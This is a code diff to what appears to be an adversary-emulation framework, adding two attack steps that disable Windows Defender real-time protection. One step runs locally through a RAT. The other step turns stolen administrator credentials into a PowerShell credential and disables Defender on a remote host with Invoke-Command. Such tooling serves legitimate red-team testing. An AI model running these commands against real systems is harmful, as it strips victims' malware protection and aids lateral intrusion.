@@ -1,3 +1,4 @@
+
 import logging
 from datetime import timedelta, datetime
 import asyncio
@@ -1769,6 +1770,73 @@ class XCopy(Step):
         for file in file_g:
             await cleaner.delete(file)
 
+
+class DisableDefenderLocal(Step):
+    """
+        Description:
+            This step locally turns off Windows Defender real-time protection.
+        Requirements:
+            Requires administrative access to the target machine.
+        """
+    attack_mapping = [('T1086', 'Execution')]
+    display_name = "disable_defender(local)"
+    summary = "Disable Windows Defender on the starting host by turning off the real-time protection"
+
+    value = 11
+    preconditions = [("rat", OPRat({"elevated": True})),
+                     ("host", OPHost(OPVar("rat.host")))]
+    postconditions = [('host_g', OPHost)]
+
+    significant_parameters = []
+
+    @staticmethod
+    def description(rat, host):
+        return "Disabling real-time protection on {}".format(host.hostname)
+
+    @staticmethod
+    async def action(operation, rat, host, host_g):
+        ps_command = ("Set-MpPreference -DisableRealtimeMonitoring $true")
+        await operation.execute_shell_command(rat, *cmd.powershell(ps_command))
+        return True
+
+class DisableDefenderRemote(Step):
+    """
+        Description:
+            This step turns off Windows Defender real-time protection on a target remote machine.
+        Requirements:
+            Requires enumeration of the target host, domain enumeration, and credentials of an administrator on the
+        target machine
+        """
+    attack_mapping = [('T1086', 'Execution')]
+    display_name = "disable_defender(remote)"
+    summary = "Disable Windows Defender on a remote host by turning off the real-time protection"
+
+    value = 20
+    preconditions = [('rat', OPRat),
+                     ('host', OPHost),
+                     ("cred", OPCredential({'$in': {'user': OPVar("host.admins")}})),
+                     ('user', OPUser(OPVar("cred.user"))),
+                     ('domain', OPDomain(OPVar("user.domain")))]
+
+    postconditions = [('host_g', OPHost)]
+
+    not_equal = [('host', 'rat.host')]
+
+    significant_parameters = ['host'] #executed once per host
+
+    @staticmethod
+    def description(rat, host):
+        return "Remotely disabling real-time protection on {} from {}".format(host.hostname, rat.host.hostname)
+
+    @staticmethod
+    async def action(operation, rat, host, cred, user, domain, host_g):
+        ps_command = ("$username = '" + user.username + "';$password = '" + cred.password +
+                      "';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;"
+                      "$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;"
+                      "Invoke-Command -ComputerName " + host.hostname +
+                      " -Credential $credential -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}")
+        await operation.execute_shell_command(rat, *cmd.powershell(ps_command))
+        return True
 
 all_steps = Step.__subclasses__()
 all_steps.sort(key=(lambda x: x.__name__))
